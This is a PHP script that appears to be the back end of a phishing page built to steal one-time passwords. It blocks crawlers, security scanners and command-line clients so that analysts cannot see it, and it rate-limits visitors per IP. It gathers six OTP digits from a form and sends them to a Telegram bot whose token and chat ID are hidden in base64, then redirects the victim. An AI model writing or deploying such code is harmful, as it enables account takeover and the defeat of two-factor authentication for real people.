<?php
session_start();

// 1. Filtro User-Agent per bloccare bot noti
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    $botPattern = '/bot[^a-z]|crawl|spider|archiver|jabber|scan|graber|harvest|track|pingmon|screenshot|curl|wget|python-requests|go-http-client|java|okhttp|httpclient|scrapy|phpspider|pinterest|cloudflare|semrush/i';
    if (empty($userAgent) || preg_match($botPattern, strtolower($userAgent))) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    if (!isset($_SERVER['HTTP_ACCEPT']) || !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    $_SESSION['verified'] = true;
}

// 2. Generazione del token per la sessione e honeypot
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (!isset($_SESSION['form_token'])) {
        $_SESSION['form_token'] = bin2hex(random_bytes(16));  // Imposta un nuovo token se non esiste
        $_SESSION['form_start'] = time();
    }
}
$hpField = 'hp_' . substr(md5($_SESSION['form_token'] ?? ''), 0, 8);  // Usa un valore vuoto se 'form_token' è null

// 3. Rate Limiting per IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = [
    'GET' => ['limit' => 30, 'window' => 300],
    'POST' => ['limit' => 10, 'window' => 600]
];
$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$method = $_SERVER['REQUEST_METHOD'];
$currentTime = time();

if (!isset($attempts[$ip][$method])) {
    $attempts[$ip][$method] = ['count' => 1, 'first' => $currentTime, 'last' => $currentTime];
} else {
    $attempts[$ip][$method]['count']++;
    $attempts[$ip][$method]['last'] = $currentTime;
    if ($currentTime - $attempts[$ip][$method]['first'] > $rateLimits[$method]['window']) {
        unset($attempts[$ip][$method]);
    }
}
if ($attempts[$ip][$method]['count'] > $rateLimits[$method]['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_SESSION['form_token']) && !empty($_POST[$hpField])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }

    $otpcode0 = $_POST["otpCode-0"];
    $otpcode1 = $_POST["otpCode-1"];
    $otpcode2 = $_POST["otpCode-2"];
    $otpcode3 = $_POST["otpCode-3"];
    $otpcode4 = $_POST["otpCode-4"];
    $otpcode5 = $_POST["otpCode-5"];

    $botApiToken = base64_decode('NzUzNzQ5NzY5MTpBQUhidlY0QUNGM1NUd0tLRjRIR3lMcXFmbGtJMV83cGZ6Yw==');
    $channelId = base64_decode('ODAxNzA4NjcxNQ==');

    $txt = "🔑OTP🔑: {$otpcode0}{$otpcode1}{$otpcode2}{$otpcode3}{$otpcode4}{$otpcode5}";

    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);
    curl_exec($curl);
    curl_close($curl);

    unset($attempts[$ip]['POST']);
    file_put_contents($attemptsFile, json_encode($attempts));

    header("Location: redirect/index.html");
    exit;
}
?>
